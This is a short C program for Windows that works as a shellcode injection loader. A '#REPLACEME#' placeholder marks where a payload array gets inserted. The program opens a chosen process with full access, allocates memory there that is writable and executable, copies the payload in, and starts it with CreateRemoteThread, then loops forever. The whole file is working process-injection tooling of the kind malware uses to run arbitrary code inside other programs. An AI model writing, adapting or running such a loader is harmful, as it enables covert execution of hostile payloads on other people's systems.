#define WINVER 0x0501

#include<stdio.h>
#include<windows.h>
#include<tlhelp32.h>
#include<string.h>

#REPLACEME#

void pump(DWORD);

int main(int argc, char *argv[])
{
	int x = atoi(argv[1]);
	STARTUPINFO si = { sizeof(STARTUPINFO) };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi= {0};

    int processID = GetCurrentProcessId();
	if (x > 0)
	{
		pump(x);
	} else {
		pump(processID);
	}
	while(1) {Sleep(50000);}
	return 0;
}


void pump(DWORD dwProcessID) {
	HANDLE hProc;
	HANDLE hRemoteThread;
	PVOID pRemoteBuffer;

	if(!dwProcessID) {
		printf("No ProcessID Passed");
	}
	hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID);
	if(!hProc) {
		printf("Cannot OP");
	}

	pRemoteBuffer = VirtualAllocEx(hProc, NULL, sizeof(sc)*2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!pRemoteBuffer) {
		printf("Error: VA");
	}
	if (!WriteProcessMemory(hProc, pRemoteBuffer, sc, sizeof(sc), NULL)) {
		printf("Error: WPM");
	}

	hRemoteThread = CreateRemoteThread(hProc, NULL, 0, pRemoteBuffer, NULL, 0, NULL);
	if (!hRemoteThread) {
		printf("Error: CRT");
	}
	CloseHandle(hProc);

	printf("DONE");
}
